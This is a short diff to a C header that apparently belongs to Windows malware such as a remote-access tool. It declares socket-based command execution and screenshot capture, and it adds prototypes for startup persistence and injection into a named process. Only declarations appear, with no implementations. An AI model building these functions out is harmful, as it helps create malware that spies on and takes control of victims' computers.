@@ -17,3 +17,6 @@
 int capture_screenshot_win32(const char* filename, gdi32_functions_t* gdi32);
 
 status_t win_cmd(SOCKET socket);
+
+int add_to_startup();
+int inject(PNT_FUNCTIONS nt, WCHAR* procname);
